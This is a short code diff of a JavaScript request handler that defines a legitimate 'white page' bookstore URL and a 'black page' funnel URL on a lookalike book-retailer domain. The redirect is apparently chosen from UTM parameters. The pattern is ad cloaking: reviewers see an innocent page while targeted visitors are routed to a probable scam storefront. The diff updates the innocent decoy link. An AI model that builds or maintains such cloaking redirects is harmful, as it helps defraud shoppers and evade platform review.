@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.kennys.ie/shop/the-children-of-eve-john-connolly-9781529391930";
+    const whitePageURL = "https://bookoutlet.com/book/friends-lovers-and-the-big-terrible-thing-a-memoir/perry-matthew/9781250866455B";
     const blackPageURL = "https://wabebookscom.myfunnelish.com/cshhhhhn-1747502439037021";
   
     // Parse the UTM parameters from the request URL
